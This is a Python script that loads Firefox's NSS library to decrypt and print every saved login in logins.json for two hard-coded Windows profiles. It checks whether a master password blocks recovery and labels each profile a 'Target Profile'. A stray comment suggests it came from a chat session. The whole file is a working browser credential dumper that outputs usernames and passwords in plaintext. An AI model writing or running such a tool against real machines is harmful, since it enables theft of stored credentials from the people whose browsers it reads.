import os
import json
import base64
import ctypes
from ctypes import Structure, POINTER, c_void_p, c_char_p, c_int, byref

# Define NSS/SEC structures
class SECItem(Structure):
    _fields_ = [("type", c_int), ("data", c_void_p), ("len", c_int)]

def decrypt_firefox(profile_path, nss_path):
    print(f"\n[*] Target Profile: {profile_path}")
    
    # Add NSS path to environment
    os.environ['PATH'] = nss_path + os.pathsep + os.environ['PATH']
    
    try:
        nss = ctypes.CDLL(os.path.join(nss_path, "nss3.dll"))
    except Exception as e:
        print(f"[-] Failed to load nss3.dll: {e}")
        return

    # Define function signatures
    nss.NSS_Init.argtypes = [c_char_p]
    nss.PK11SDR_Decrypt.argtypes = [POINTER(SECItem), POINTER(SECItem), c_void_p]
    nss.PORT_GetError.restype = c_int
    nss.PK11_GetInternalKeySlot.restype = c_void_p
    nss.PK11_Authenticate.argtypes = [c_void_p, c_int, c_void_p]

    # Initialize NSS
    init_str = f"sql:{profile_path}"
    if nss.NSS_Init(c_char_p(init_str.encode('utf-8'))) != 0:
        print(f"[-] NSS_Init failed. Error Code: {nss.PORT_GetError()}")
        return

    # Check for Master Password
    slot = nss.PK11_GetInternalKeySlot()
    if slot:
        # Try empty password
        if nss.PK11_Authenticate(slot, 1, c_char_p(b"")) != 0:
            print("[!] MASTER PASSWORD DETECTED. Plaintext recovery blocked.")
            nss.NSS_Shutdown()
            return
        else:
            print("[+] No Master Password set or empty password accepted.")

    logins_json = os.path.join(profile_path, 'logins.json')
    if not os.path.exists(logins_json):
        print(f"[-] {logins_json} not found.")
        nss.NSS_Shutdown()
        return

    with open(logins_json, 'r') as f:
        data = json.load(f)

    print(f"[+] Decrypting {len(data.get('logins', []))} entries...")

    for login in data.get('logins', []):
        hostname = login.get('hostname', 'N/A')
        enc_user_b64 = login.get('encryptedUsername')
        enc_pass_b64 = login.get('encryptedPassword')
        
        if not enc_user_b64 or not enc_pass_b64:
            continue

        enc_user = base64.b64decode(enc_user_b64)
        enc_pass = base64.b64decode(enc_pass_b64)

        # Decrypt User
        item_in = SECItem(0, ctypes.cast(c_char_p(enc_user), c_void_p), len(enc_user))
        item_out = SECItem(0, None, 0)
        
        user_plain = "UNKNOWN"
        if nss.PK11SDR_Decrypt(byref(item_in), byref(item_out), None) == 0:
            user_plain = ctypes.string_at(item_out.data, item_out.len).decode('utf-8')

        # Decrypt Pass
        item_in = SECItem(0, ctypes.cast(c_char_p(enc_pass), c_void_p), len(enc_pass))
        item_out = SECItem(0, None, 0)
        
        pass_plain = "UNKNOWN"
        if nss.PK11SDR_Decrypt(byref(item_in), byref(item_out), None) == 0:
            pass_plain = ctypes.string_at(item_out.data, item_out.len).decode('utf-8')

        if user_plain != "UNKNOWN" or pass_plain != "UNKNOWN":
            print(f"\n[!] ENTRY: {hostname}")
            print(f"    -> USER: {user_plain}")
            print(f"    -> PASS: {pass_plain}")

    nss.NSS_Shutdown()

if __name__ == '__main__':
    profiles = [
        r'C:\Users\Lance\AppData\Roaming\Mozilla\Firefox\Profiles\mutcsx0v.default-release',
        r'C:\Users\Lance\AppData\Roaming\Mozilla\Firefox\Profiles\44PP2Dju.Profile 1'
    ]
    nss_lib = r'CProgram Files\Mozilla Firefox' # Typo in path? Fixing in next turn or here
    nss_lib = r'C:\Program Files\Mozilla Firefox'
    for p in profiles:
        decrypt_firefox(p, nss_lib)
